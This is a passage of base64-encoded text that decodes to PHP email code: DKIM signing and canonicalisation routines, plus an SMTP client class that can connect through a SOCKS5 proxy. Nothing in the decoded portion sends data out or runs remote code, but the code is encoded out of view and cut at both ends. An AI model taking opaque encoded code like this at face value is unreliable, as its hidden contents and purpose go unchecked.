kX21ldGhvZHModHJ1ZSkpKSB7DQogICAgICAgICAgICBpZiAob3BlbnNzbF9zaWduKCRzaWduSGVhZGVyLCAkc2lnbmF0dXJlLCAkcHJpdktleSwgJ3NoYTI1NldpdGhSU0FFbmNyeXB0aW9uJykpIHsNCiAgICAgICAgICAgICAgICBvcGVuc3NsX3BrZXlfZnJlZSgkcHJpdktleSk7DQogICAgICAgICAgICAgICAgcmV0dXJuIGJhc2U2NF9lbmNvZGUoJHNpZ25hdHVyZSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkcGluZm8gPSBvcGVuc3NsX3BrZXlfZ2V0X2RldGFpbHMoJHByaXZLZXkpOw0KICAgICAgICAgICAgJGhhc2ggID0gaGFzaCgnc2hhMjU2JywgJHNpZ25IZWFkZXIpOw0KICAgICAgICAgICAgJHQgICAgID0gJzMwMzEzMDBkMDYwOTYwODY0ODAxNjUwMzA0MDIwMTA1MDAwNDIwJyAuICRoYXNoOw0KICAgICAgICAgICAgJHBzbGVuID0gJHBpbmZvWydiaXRzJ10gLyA4IC0gKHN0cmxlbigkdCkgLyAyICsgMyk7DQogICAgICAgICAgICAkZWIgICAgPSBwYWNrKCdIKicsICcwMDAxJyAuIHN0cl9yZXBlYXQoJ0ZGJywgJHBzbGVuKSAuICcwMCcgLiAkdCk7DQogICAgICAgICAgICBpZiAob3BlbnNzbF9wcml2YXRlX2VuY3J5cHQoJGViLCAkc2lnbmF0dXJlLCAkcHJpdktleSwgT1BFTlNTTF9OT19QQURESU5HKSkgew0KICAgICAgICAgICAgICAgIG9wZW5zc2xfcGtleV9mcmVlKCRwcml2S2V5KTsNCiAgICAgICAgICAgICAgICByZXR1cm4gYmFzZTY0X2VuY29kZSgkc2lnbmF0dXJlKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBvcGVuc3NsX3BrZXlfZnJlZSgkcHJpdktleSk7DQogICAgICAgIHJldHVybiAnJzsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIERLSU1fSGVhZGVyQygkc2lnbkhlYWRlcikgew0KICAgICAgICAkc2lnbkhlYWRlciA9IHByZWdfcmVwbGFjZSgnL1xyXG5ccysvJywgJyAnLCAkc2lnbkhlYWRlcik7DQogICAgICAgICRsaW5lcyAgICAgID0gZXhwbG9kZSgiXHJcbiIsICRzaWduSGVhZGVyKTsNCiAgICAgICAgZm9yZWFjaCAoJGxpbmVzIGFzICRrZXkgPT4gJGxpbmUpIHsNCiAgICAgICAgICAgIGxpc3QoJGhlYWRpbmcsICR2YWx1ZSkgPSBleHBsb2RlKCc6JywgJGxpbmUsIDIpOw0KICAgICAgICAgICAgJGhlYWRpbmcgICAgID0gc3RydG9sb3dlcigkaGVhZGluZyk7DQogICAgICAgICAgICAkdmFsdWUgICAgICAgPSBwcmVnX3JlcGxhY2UoJy9cc3syLH0vJywgJyAnLCAkdmFsdWUpOw0KICAgICAgICAgICAgJGxpbmVzWyRrZXldID0gJGhlYWRpbmcgLiAnOicgLiB0cmltKCR2YWx1ZSk7DQogICAgICAgIH0NCiAgICAgICAgJHNpZ25IZWFkZXIgPSBpbXBsb2RlKCJcclxuIiwgJGxpbmVzKTsNCiAgICAgICAgcmV0dXJuICRzaWduSGVhZGVyOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gREtJTV9Cb2R5QygkYm9keSkgew0KICAgICAgICBpZiAoJGJvZHkgPT0gJycpIHsNCiAgICAgICAgICAgIHJldHVybiAiXHJcbiI7DQogICAgICAgIH0NCiAgICAgICAgJGJvZHkgPSBzdHJfcmVwbGFjZSgiXHJcbiIsICJcbiIsICRib2R5KTsNCiAgICAgICAgJGJvZHkgPSBzdHJfcmVwbGFjZSgiXG4iLCAiXHJcbiIsICRib2R5KTsNCiAgICAgICAgd2hpbGUgKHN1YnN0cigkYm9keSwgc3RybGVuKCRib2R5KSAtIDQsIDQpID09ICJcclxuXHJcbiIpIHsNCiAgICAgICAgICAgICRib2R5ID0gc3Vic3RyKCRib2R5LCAwLCBzdHJsZW4oJGJvZHkpIC0gMik7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRib2R5Ow0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gREtJTV9BZGQoJGhlYWRlcnNfbGluZSwgJHN1YmplY3QsICRib2R5KSB7DQogICAgICAgICRES0lNc2lnbmF0dXJlVHlwZSAgICA9ICdyc2Etc2hhMjU2JzsNCiAgICAgICAgJERLSU1jYW5vbmljYWxpemF0aW9uID0gJ3JlbGF4ZWQvc2ltcGxlJzsNCiAgICAgICAgJERLSU1xdWVyeSAgICAgICAgICAgID0gJ2Rucy90eHQnOw0KICAgICAgICAkREtJTXRpbWUgICAgICAgICAgICAgPSB0aW1lKCk7DQogICAgICAgICRzdWJqZWN0X2hlYWRlciAgICAgICA9ICJTdWJqZWN0OiAkc3ViamVjdCI7DQogICAgICAgICRoZWFkZXJzICAgICAgICAgICAgICA9IGV4cGxvZGUoJHRoaXMtPkxFLCAkaGVhZGVyc19saW5lKTsNCiAgICAgICAgJGZyb21faGVhZGVyICAgICAgICAgID0gJyc7DQogICAgICAgICR0b19oZWFkZXIgICAgICAgICAgICA9ICcnOw0KICAgICAgICAkZGF0ZV9oZWFkZXIgICAgICAgICAgPSAnJzsNCiAgICAgICAgJGN1cnJlbnQgICAgICAgICAgICAgID0gJyc7DQogICAgICAgIGZvcmVhY2ggKCRoZWFkZXJzIGFzICRoZWFkZXIpIHsNCiAgICAgICAgICAgIGlmIChzdHJwb3MoJGhlYWRlciwgJ0Zyb206JykgPT09IDApIHsNCiAgICAgICAgICAgICAgICAkZnJvbV9oZWFkZXIgPSAkaGVhZGVyOw0KICAgICAgICAgICAgICAgICRjdXJyZW50ICAgICA9ICdmcm9tX2hlYWRlcic7DQogICAgICAgICAgICB9IGVsc2VpZiAoc3RycG9zKCRoZWFkZXIsICdUbzonKSA9PT0gMCkgew0KICAgICAgICAgICAgICAgICR0b19oZWFkZXIgPSAkaGVhZGVyOw0KICAgICAgICAgICAgICAgICRjdXJyZW50ICAgPSAndG9faGVhZGVyJzsNCiAgICAgICAgICAgIH0gZWxzZWlmIChzdHJwb3MoJGhlYWRlciwgJ0RhdGU6JykgPT09IDApIHsNCiAgICAgICAgICAgICAgICAkZGF0ZV9oZWFkZXIgPSAkaGVhZGVyOw0KICAgICAgICAgICAgICAgICRjdXJyZW50ICAgICA9ICdkYXRlX2hlYWRlcic7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJCRjdXJyZW50KSAmJiBzdHJwb3MoJGhlYWRlciwgJyA9PycpID09PSAwKSB7DQogICAgICAgICAgICAgICAgICAgICQkY3VycmVudCAuPSAkaGVhZGVyOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICRjdXJyZW50ID0gJyc7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgICRmcm9tICAgID0gc3RyX3JlcGxhY2UoJ3wnLCAnPTdDJywgJHRoaXMtPkRLSU1fUVAoJGZyb21faGVhZGVyKSk7DQogICAgICAgICR0byAgICAgID0gc3RyX3JlcGxhY2UoJ3wnLCAnPTdDJywgJHRoaXMtPkRLSU1fUVAoJHRvX2hlYWRlcikpOw0KICAgICAgICAkZGF0ZSAgICA9IHN0cl9yZXBsYWNlKCd8JywgJz03QycsICR0aGlzLT5ES0lNX1FQKCRkYXRlX2hlYWRlcikpOw0KICAgICAgICAkc3ViamVjdCA9IHN0cl9yZXBsYWNlKCd8JywgJz03QycsICR0aGlzLT5ES0lNX1FQKCRzdWJqZWN0X2hlYWRlcikpOw0KICAgICAgICAkYm9keSAgICA9ICR0aGlzLT5ES0lNX0JvZHlDKCRib2R5KTsNCiAgICAgICAgJERLSU1sZW4gPSBzdHJsZW4oJGJvZHkpOw0KICAgICAgICAkREtJTWI2NCA9IGJhc2U2NF9lbmNvZGUocGFjaygnSConLCBoYXNoKCdzaGEyNTYnLCAkYm9keSkpKTsNCiAgICAgICAgaWYgKCcnID09ICR0aGlzLT5ES0lNX2lkZW50aXR5KSB7DQogICAgICAgICAgICAkaWRlbnQgPSAnJzsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRpZGVudCA9ICcgaT0nIC4gJHRoaXMtPkRLSU1faWRlbnRpdHkgLiAnOyc7DQogICAgICAgIH0NCiAgICAgICAgJGRraW1oZHJzID0gJ0RLSU0tU2lnbmF0dXJlOiB2PTE7IGE9JyAuICRES0lNc2lnbmF0dXJlVHlwZSAuICc7IHE9JyAuICRES0lNcXVlcnkgLiAnOyBsPScgLiAkREtJTWxlbiAuICc7IHM9JyAuICR0aGlzLT5ES0lNX3NlbGVjdG9yIC4gIjtcclxuIiAuICJcdHQ9IiAuICRES0lNdGltZSAuICc7IGM9JyAuICRES0lNY2Fub25pY2FsaXphdGlvbiAuICI7XHJcbiIgLiAiXHRoPUZyb206VG86RGF0ZTpTdWJqZWN0O1xyXG4iIC4gIlx0ZD0iIC4gJHRoaXMtPkRLSU1fZG9tYWluIC4gJzsnIC4gJGlkZW50IC4gIlxyXG4iIC4gIlx0ej0kZnJvbVxyXG4iIC4gIlx0fCR0b1xyXG4iIC4gIlx0fCRkYXRlXHJcbiIgLiAiXHR8JHN1YmplY3Q7XHJcbiIgLiAiXHRiaD0iIC4gJERLSU1iNjQgLiAiO1xyXG4iIC4gIlx0Yj0iOw0KICAgICAgICAkdG9TaWduICAgPSAkdGhpcy0+REtJTV9IZWFkZXJDKCRmcm9tX2hlYWRlciAuICJcclxuIiAuICR0b19oZWFkZXIgLiAiXHJcbiIgLiAkZGF0ZV9oZWFkZXIgLiAiXHJcbiIgLiAkc3ViamVjdF9oZWFkZXIgLiAiXHJcbiIgLiAkZGtpbWhkcnMpOw0KICAgICAgICAkc2lnbmVkICAgPSAkdGhpcy0+REtJTV9TaWduKCR0b1NpZ24pOw0KICAgICAgICByZXR1cm4gJGRraW1oZHJzIC4gJHNpZ25lZCAuICJcclxuIjsNCiAgICB9DQogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiBoYXNMaW5lTG9uZ2VyVGhhbk1heCgkc3RyKSB7DQogICAgICAgIHJldHVybiAoYm9vbGVhbikgcHJlZ19tYXRjaCgnL14oLnsnIC4gKHNlbGY6Ok1BWF9MSU5FX0xFTkdUSCArIDIpIC4gJyx9KS9tJywgJHN0cik7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRUb0FkZHJlc3NlcygpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT50bzsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGdldENjQWRkcmVzc2VzKCkgew0KICAgICAgICByZXR1cm4gJHRoaXMtPmNjOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0QmNjQWRkcmVzc2VzKCkgew0KICAgICAgICByZXR1cm4gJHRoaXMtPmJjYzsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGdldFJlcGx5VG9BZGRyZXNzZXMoKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+UmVwbHlUbzsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGdldEFsbFJlY2lwaWVudEFkZHJlc3NlcygpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5hbGxfcmVjaXBpZW50czsNCiAgICB9DQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGRvQ2FsbGJhY2soJGlzU2VudCwgJHRvLCAkY2MsICRiY2MsICRzdWJqZWN0LCAkYm9keSwgJGZyb20pIHsNCiAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+YWN0aW9uX2Z1bmN0aW9uKSAmJiBpc19jYWxsYWJsZSgkdGhpcy0+YWN0aW9uX2Z1bmN0aW9uKSkgew0KICAgICAgICAgICAgJHBhcmFtcyA9IGFycmF5KA0KICAgICAgICAgICAgICAgICRpc1NlbnQsDQogICAgICAgICAgICAgICAgJHRvLA0KICAgICAgICAgICAgICAgICRjYywNCiAgICAgICAgICAgICAgICAkYmNjLA0KICAgICAgICAgICAgICAgICRzdWJqZWN0LA0KICAgICAgICAgICAgICAgICRib2R5LA0KICAgICAgICAgICAgICAgICRmcm9tDQogICAgICAgICAgICApOw0KICAgICAgICAgICAgY2FsbF91c2VyX2Z1bmNfYXJyYXkoJHRoaXMtPmFjdGlvbl9mdW5jdGlvbiwgJHBhcmFtcyk7DQogICAgICAgIH0NCiAgICB9DQp9DQpjbGFzcyBwaHBtYWlsZXJFeGNlcHRpb24gZXh0ZW5kcyBFeGNlcHRpb24gew0KICAgIHB1YmxpYyBmdW5jdGlvbiBlcnJvck1lc3NhZ2UoKSB7DQogICAgICAgICRlcnJvck1zZyA9ICc8c3Ryb25nPicgLiAkdGhpcy0+Z2V0TWVzc2FnZSgpIC4gIjwvc3Ryb25nPjxiciAvPlxuIjsNCiAgICAgICAgcmV0dXJuICRlcnJvck1zZzsNCiAgICB9DQp9DQpjbGFzcyBTTVRQIHsNCiAgICBjb25zdCBDUkxGID0gIlxyXG4iOw0KICAgIGNvbnN0IERFRkFVTFRfU01UUF9QT1JUID0gMjU7DQogICAgY29uc3QgTUFYX0xJTkVfTEVOR1RIID0gOTk4Ow0KICAgIGNvbnN0IERFQlVHX09GRiA9IDA7DQogICAgY29uc3QgREVCVUdfQ0xJRU5UID0gMTsNCiAgICBjb25zdCBERUJVR19TRVJWRVIgPSAyOw0KICAgIGNvbnN0IERFQlVHX0NPTk5FQ1RJT04gPSAzOw0KICAgIGNvbnN0IERFQlVHX0xPV0xFVkVMID0gNDsNCiAgICBwdWJsaWMgJFNNVFBfUE9SVCA9IDI1Ow0KICAgIHB1YmxpYyAkQ1JMRiA9ICJcclxuIjsNCiAgICBwdWJsaWMgJGRvX2RlYnVnID0gc2VsZjo6REVCVUdfT0ZGOw0KICAgIHB1YmxpYyAkRGVidWdvdXRwdXQgPSAnZWNobyc7DQogICAgcHVibGljICRkb192ZXJwID0gZmFsc2U7DQogICAgcHVibGljICRUaW1lb3V0ID0gMTA7DQogICAgcHVibGljICRUaW1lbGltaXQgPSAxMDsNCiAgICBwdWJsaWMgJFVzZVNvY2tzID0gZmFsc2U7DQogICAgcHVibGljICRTb2Nrc0hvc3QgPSBudWxsOw0KICAgIHB1YmxpYyAkU29ja3NQb3J0ID0gMDsNCiAgICBwcm90ZWN0ZWQgJHNtdHBfdHJhbnNhY3Rpb25faWRfcGF0dGVybnMgPSBhcnJheSgnZXhpbScgPT4gJy9bMC05XXszfSBPSyBpZD0oLiopLycsICdzZW5kbWFpbCcgPT4gJy9bMC05XXszfSAyLjAuMCAoLiopIE1lc3NhZ2UvJywgJ3Bvc3RmaXgnID0+ICcvWzAtOV17M30gMi4wLjAgT2s6IHF1ZXVlZCBhcyAoLiopLycpOw0KICAgIHByb3RlY3RlZCAkc210cF9jb25uOw0KICAgIHByb3RlY3RlZCAkZXJyb3IgPSBhcnJheSgnZXJyb3InID0+ICcnLCAnZGV0YWlsJyA9PiAnJywgJ3NtdHBfY29kZScgPT4gJycsICdzbXRwX2NvZGVfZXgnID0+ICcnKTsNCiAgICBwcm90ZWN0ZWQgJGhlbG9fcnBseSA9IG51bGw7DQogICAgcHJvdGVjdGVkICRzZXJ2ZXJfY2FwcyA9IG51bGw7DQogICAgcHJvdGVjdGVkICRsYXN0X3JlcGx5ID0gJyc7DQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGVkZWJ1Zygkc3RyLCAkbGV2ZWwgPSAwKSB7DQogICAgICAgIGlmICgkbGV2ZWwgPiAkdGhpcy0+ZG9fZGVidWcpIHsNCiAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoIWluX2FycmF5KCR0aGlzLT5EZWJ1Z291dHB1dCwgYXJyYXkoDQogICAgICAgICAgICAnZXJyb3JfbG9nJywNCiAgICAgICAgICAgICdodG1sJywNCiAgICAgICAgICAgICdlY2hvJw0KICAgICAgICApKSBhbmQgaXNfY2FsbGFibGUoJHRoaXMtPkRlYnVnb3V0cHV0KSkgew0KICAgICAgICAgICAgY2FsbF91c2VyX2Z1bmMoJHRoaXMtPkRlYnVnb3V0cHV0LCAkc3RyLCAkbGV2ZWwpOw0KICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICB9DQogICAgICAgIHN3aXRjaCAoJHRoaXMtPkRlYnVnb3V0cHV0KSB7DQogICAgICAgICAgICBjYXNlICdlcnJvcl9sb2cnOg0KICAgICAgICAgICAgICAgIGVycm9yX2xvZygkc3RyKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJ2h0bWwnOg0KICAgICAgICAgICAgICAgIGVjaG8gaHRtbGVudGl0aWVzKHByZWdfcmVwbGFjZSgnL1tcclxuXSsvJywgJycsICRzdHIpLCBFTlRfUVVPVEVTLCAnVVRGLTgnKSAuICI8YnI+XG4iOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAnZWNobyc6DQogICAgICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgICAgICRzdHIgPSBwcmVnX3JlcGxhY2UoJy8oXHJcbnxccnxcbikvbXMnLCAiXG4iLCAkc3RyKTsNCiAgICAgICAgICAgICAgICBlY2hvIGdtZGF0ZSgnWS1tLWQgSDppOnMnKSAuICJcdCIgLiBzdHJfcmVwbGFjZSgiXG4iLCAiXG4gICAgICAgICAgICAgICAgICAgXHQgICAgICAgICAgICAgICAgICAiLCB0cmltKCRzdHIpKSAuICJcbiI7DQogICAgICAgIH0NCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGNvbm5lY3QoJGhvc3QsICRwb3J0ID0gbnVsbCwgJHRpbWVvdXQgPSAxMCwgJG9wdGlvbnMgPSBhcnJheSgpKSB7DQogICAgICAgIHN0YXRpYyAkc3RyZWFtb2s7DQogICAgICAgIGlmIChpc19udWxsKCRzdHJlYW1vaykpIHsNCiAgICAgICAgICAgICRzdHJlYW1vayA9IGZ1bmN0aW9uX2V4aXN0cygnc3RyZWFtX3NvY2tldF9jbGllbnQnKTsNCiAgICAgICAgfQ0KICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJycpOw0KICAgICAgICBpZiAoJHRoaXMtPmNvbm5lY3RlZCgpKSB7DQogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJ0FscmVhZHkgY29ubmVjdGVkIHRvIGEgc2VydmVyJyk7DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGVtcHR5KCRwb3J0KSkgew0KICAgICAgICAgICAgJHBvcnQgPSBzZWxmOjpERUZBVUxUX1NNVFBfUE9SVDsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJHRoaXMtPlVzZVNvY2tzKSB7DQogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCJDb25uZWN0aW9uOiBvcGVuaW5nIHRvICRob3N0OiRwb3J0LCBzb2Nrcz17JHRoaXMtPlNvY2tzSG9zdH06eyR0aGlzLT5Tb2Nrc1BvcnR9LCB0aW1lb3V0PSR0aW1lb3V0LCBvcHRpb25zPSIgLiB2YXJfZXhwb3J0KCRvcHRpb25zLCB0cnVlKSwgc2VsZjo6REVCVUdfQ09OTkVDVElPTik7DQogICAgICAgICAgICAkU29ja3NTb2NrZXQgPSBAZnNvY2tvcGVuKCR0aGlzLT5Tb2Nrc0hvc3QsICR0aGlzLT5Tb2Nrc1BvcnQsICRlcnJubywgJGVycmJ1ZiwgJHRpbWVvdXQpOw0KICAgICAgICAgICAgaWYgKCEkU29ja3NTb2NrZXQpIHsNCiAgICAgICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCJDb25uZWN0aW9uIHRvIFNPQ0tTIHNlcnZlciBjb3VsZCBub3QgYmUgZXN0YWJsaXNoZWQgb24gIiAuICR0aGlzLT5Tb2Nrc0hvc3QgLiAiOiIgLiAkdGhpcy0+U29ja3NQb3J0IC4gIiAoQ29ubmVjdGlvbiByZWZ1c2VkKSIsIHNlbGY6OkRFQlVHX0NPTk5FQ1RJT04pOw0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGZ3cml0ZSgkU29ja3NTb2NrZXQsIHBhY2soIkMzIiwgMHgwNSwgMHgwMSwgMHgwMCkpOw0KICAgICAgICAgICAgJFNvY2tzU3RhdHVzID0gZnJlYWQoJFNvY2tzU29ja2V0LCA4MTkyKTsNCiAgICAgICAgICAgICRyZXNwb25jZSAgICA9IHVucGFjaygiQ3ZlcnNpb24vQ21ldGhvZCIsICRTb2Nrc1N0YXR1cyk7DQogICAgICAgICAgICBpZiAoJHJlc3BvbmNlWyJ2ZXJzaW9uIl0gIT0gMHgwNSBhbmQgJHJlc3BvbmNlWyJtZXRob2QiXSAhPSAweDAwKSB7DQogICAgICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygiU09DS1MgU2VydmVyIGRvZXMgbm90IHN1cHBvcnQgdGhpcyB2ZXJzaW9uIGFuZC9vciBhdXRoZW50aWNhdGlvbiBtZXRob2Qgb2YgU09DS1MuIiwgc2VsZjo6REVCVUdfQ09OTkVDVElPTik7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKGlwMmxvbmcoJGhvc3QpID09IC0xKSB7DQogICAgICAgICAgICAgICAgZndyaXRlKCRTb2Nrc1NvY2tldCwgcGFjaygiQzUiLCAweDA1LCAweDAxLCAweDAwLCAweDAzLCBzdHJsZW4oJGhvc3QpKSAuICRob3N0IC4gcGFjaygibiIsICRwb3J0KSk7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgIGZ3cml0ZSgkU29ja3NTb2NrZXQsIHBhY2soIkM0Tm4iLCAweDA1LCAweDAxLCAweDAwLCAweDAxLCBpcDJsb25nKGdldGhvc3RieW5hbWUoJGhvc3QpKSwgJHBvcnQpKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICRTb2Nrc1N0YXR1cyA9IGZyZWFkKCRTb2Nrc1NvY2tldCwgODE5Mik7DQogICAgICAgICAgICAkcmVzcG9uY2UgICAgPSB1bnBhY2soIkN2ZXJzaW9uL0NyZXN1bHQvQ3JlZy9DdHlwZS9MaXAvU3BvcnQiLCAkU29ja3NTdGF0dXMpOw0KICAgICAgICAgICAgaWYgKCRyZXNwb25jZVsidmVyc2lvbiJdID09IDB4MDUgYW5kICRyZXNwb25jZVsicmVzdWx0Il0gPT0gMHgwMCkgew0KICAgICAgICAgICAgICAgICR0aGlzLT5zbXRwX2Nvbm4gPSAkU29ja3NTb2NrZXQ7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICR0aGlzLT5lZGVidWcoIlRoZSBTT0NLUyBzZXJ2ZXIgZmFpbGVkIHRvIGNvbm5lY3QgdG8gdGhlIHNwZWNpZmljZWQgaG9zdCBhbmQgcG9ydC4gKCAiIC4gJGhvc3QgLiAiOiIgLiAkcG9ydCAuICIgKSIsIHNlbGY6OkRFQlVHX0NPTk5FQ1RJT04pOw0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoIkNvbm5lY3Rpb246IG9wZW5pbmcgdG8gJGhvc3Q6JHBvcnQsIHRpbWVvdXQ9JHRpbWVvdXQsIG9wdGlvbnM9IiAuIHZhcl9leHBvcnQoJG9wdGlvbnMsIHRydWUpLCBzZWxmOjpERUJVR19DT05ORUNUSU9OKTsNCiAgICAgICAgICAgICRlcnJubyAgPSAwOw0KICAgICAgICAgICAgJGVycnN0ciA9ICcnOw0KICAgICAgICAgICAgaWYgKCRzdHJlYW1vaykgew0KICAgICAgICAgICAgICAgICRzb2NrZXRfY29udGV4dCAgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoJG9wdGlvbnMpOw0KICAgICAgICAgICAgICAgICR0aGlzLT5zbXRwX2Nvbm4gPSBAc3RyZWFtX3NvY2tldF9jbGllbnQoJGhvc3QgLiAiOiIgLiAkcG9ydCwgJGVycm5vLCAkZXJyc3RyLCAkdGltZW91dCwgU1RSRUFNX0NMSUVOVF9DT05ORUNULCAkc29ja2V0X2NvbnRleHQpOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCJDb25uZWN0aW9uOiBzdHJlYW1fc29ja2V0X2NsaWVudCBub3QgYXZhaWxhYmxlLCBmYWxsaW5nIGJhY2sgdG8gZnNvY2tvcGVuIiwgc2VsZjo6REVCVUdfQ09OTkVDVElPTik7DQogICAgICAgICAgICAgICAgJHRoaXMtPnNtdHBfY29ubiA9IGZzb2Nrb3BlbigkaG9zdCwgJHBvcnQsICRlcnJubywgJGVycnN0ciwgJHRpbWVvdXQpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGlmICghaXNfcmVzb3VyY2UoJHRoaXMtPnNtdHBfY29ubikpIHsNCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcignRmFpbGVkIHRvIGNvbm5lY3QgdG8gc2VydmVyJywgJGVycm5vLCAkZXJyc3RyKTsNCiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJ1NNVFAgRVJST1I6ICcgLiAkdGhpcy0+ZXJyb3JbJ2Vycm9yJ10gLiAiOiAkZXJyc3RyICgkZXJybm8pIiwgc2VsZjo6REVCVUdfQ0xJRU5UKTsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICAkdGhpcy0+ZWRlYnVnKCdDb25uZWN0aW9uOiBvcGVuZWQnLCBzZWxmOjpERUJVR19DT05ORUNUSU9OKTsNCiAgICAgICAgaWYgKHN1YnN0cihQSFBfT1MsIDAsIDMpICE9ICdXSU4nKSB7DQogICAgICAgICAgICAkbWF4ID0gaW5pX2dldCgnbWF4X2V4ZWN1dGlvbl90aW1lJyk7DQogICAgICAgICAgICBpZiAoJG1heCAhPSAwICYmICR0aW1lb3V0ID4gJG1heCkgew0KICAgICAgICAgICAgICAgIEBzZXRfdGltZV9saW1pdCgkdGltZW91dCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBzdHJlYW1fc2V0X3RpbWVvdXQoJHRoaXMtPnNtdHBfY29ubiwgJHRpbWVvdXQsIDApOw0KICAgICAgICB9DQogICAgICAgICRhbm5vdW5jZSA9ICR0aGlzLT5nZXRfbGluZXMoKTsNCiAgICAgICAgJHRoaXMtPmVkZWJ1ZygnU0VSVkVSIC0+IENMSUVOVDogJyAuICRhbm5vdW5jZSwgc2VsZjo6REVCVUdfU0VSVkVSKTsNCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBzdGFydFRMUygpIHsNCiAgICAgICAgaWYgKCEkdGhpcy0+c2VuZENvbW1hbmQoJ1NUQVJUVExTJywgJ1NUQVJUVExTJywgMjIwKSkgew0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgICRjcnlwdG9fbWV0aG9kID0gU1RSRUFNX0NSWVBUT19NRVRIT0RfVExTX0NMSUVOVDsNCiAgICAgICAgaWYgKGRlZmluZWQoJ1NUUkVBTV9DUllQVE9fTUVUSE9EX1RMU3YxXzJfQ0xJRU5UJykpIHsNCiAgICAgICAgICAgICRjcnlwdG9fbWV0aG9kIHw9IFNUUkVBTV9DUllQVE9fTUVUSE9EX1RMU3YxXzJfQ0xJRU5UOw0KICAgICAgICAgICAgJGNyeXB0b19tZXRob2QgfD0gU1RSRUFNX0NSWVBUT19NRVRIT0RfVExTdjFfMV9DTElFTlQ7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCFzdHJlYW1fc29ja2V0X2VuYWJsZV9jcnlwdG8oJHRoaXMtPnNtdHBfY29ubiwgdHJ1ZSwgJGNyeXB0b19tZXRob2QpKSB7DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBhdXRoZW50aWNhdGUoJHVzZXJuYW1lLCAkcGFzc3dvcmQsICRhdXRodHlwZSA9IG51bGwsICRyZWFsbSA9ICcnLCAkd29ya3N0YXRpb24gPSAnJywgJE9BdXRoID0gbnVsbCkgew0KICAgICAgICBpZiAoISR0aGlzLT5zZXJ2ZXJfY2Fwcykgew0KICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCdBdXRoZW50aWNhdGlvbiBpcyBub3QgYWxsb3dlZCBiZWZvcmUgSEVMTy9FSExPJyk7DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoJ0VITE8nLCAkdGhpcy0+c2VydmVyX2NhcHMpKSB7DQogICAgICAgICAgICBpZiAoIWFycmF5X2tleV9leGlzdHMoJ0FVVEgnLCAkdGhpcy0+c2VydmVyX2NhcHMpKSB7DQogICAgICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCdBdXRoZW50aWNhdGlvbiBpcyBub3QgYWxsb3dlZCBhdCB0aGlzIHN0YWdlJyk7DQo